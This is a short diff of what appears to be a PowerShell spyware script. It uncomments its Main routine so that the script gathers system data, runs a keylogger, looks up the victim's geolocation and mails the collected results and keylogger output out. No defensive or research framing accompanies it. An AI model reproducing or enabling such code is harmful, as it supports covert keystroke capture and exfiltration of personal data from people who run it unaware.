@@ -36,13 +36,13 @@ https://stackoverflow.com/questions/21590719/check-if-user-is-a-member-of-the-lo
 
 ### Add information to resultsgithub
 function Main(){
-#$results = "RESULTS `n"
+$results = "RESULTS `n"
 #initialize
-#$results = nonAdministrativeScrapperFunctions
+$results = nonAdministrativeScrapperFunctions
 ### Runs Key logger (does not require admin privs)
-#$results += keyLogger
-#$results += findGeoLocation
-#mail $results
+$results += keyLogger
+$results += findGeoLocation
+mail $results
 createMailerToMailKeyloggerResults
 }
 
